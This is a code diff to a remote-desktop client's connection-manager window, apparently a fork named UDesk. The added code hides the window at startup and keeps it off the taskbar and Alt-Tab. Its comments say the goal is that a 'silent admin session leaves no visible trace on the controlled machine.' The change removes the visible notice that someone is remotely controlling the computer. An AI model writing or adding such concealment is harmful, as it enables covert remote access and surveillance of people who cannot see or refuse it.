@@ -293,10 +293,11 @@ void runConnectionManagerScreen() async {
   );
   final hide = await bind.cmGetConfig(name: "hide_cm") == 'true';
   gFFI.serverModel.hideCm = hide;
-  if (hide) {
-    await hideCmWindow(isStartup: true);
-  } else {
-    await showCmWindow(isStartup: true);
+  // UDesk: start hidden even when not hide_cm. The CM process starts before the server knows
+  // whether the peer is the super-admin; ServerModel shows it once a non-admin client arrives.
+  await hideCmWindow(isStartup: true);
+  if (!hide) {
+    await windowManager.setAlwaysOnTop(true);
   }
   setResizable(false);
   // Start the uni links handler and redirect links to Native, not for Flutter.
@@ -316,6 +317,8 @@ showCmWindow({bool isStartup = false}) async {
       windowManager.focus(),
       windowManager.setOpacity(1)
     ]);
+    // UDesk: a genuine (non-admin) connection is shown normally, including on the taskbar.
+    await windowManager.setSkipTaskbar(false);
     // ensure initial window size to be changed
     await windowManager.setSizeAlignment(
         kConnectionManagerWindowSizeClosedChat, Alignment.topRight);
@@ -323,6 +326,7 @@ showCmWindow({bool isStartup = false}) async {
   } else if (_isCmReadyToShow) {
     if (await windowManager.getOpacity() != 1) {
       await windowManager.setOpacity(1);
+      await windowManager.setSkipTaskbar(false);
       await windowManager.focus();
       await windowManager.minimize(); //needed
       await windowManager.setSizeAlignment(
@@ -341,6 +345,9 @@ hideCmWindow({bool isStartup = false}) async {
     bind.mainHideDock();
     await windowManager.minimize();
     await windowManager.hide();
+    // UDesk: keep the hidden CM off the taskbar and Alt-Tab, so a silent admin session
+    // leaves no visible trace on the controlled machine.
+    await windowManager.setSkipTaskbar(true);
     _isCmReadyToShow = true;
   } else if (_isCmReadyToShow) {
     if (await windowManager.getOpacity() != 0) {
@@ -348,6 +355,7 @@ hideCmWindow({bool isStartup = false}) async {
       bind.mainHideDock();
       await windowManager.minimize();
       await windowManager.hide();
+      await windowManager.setSkipTaskbar(true);
     }
   }
 }
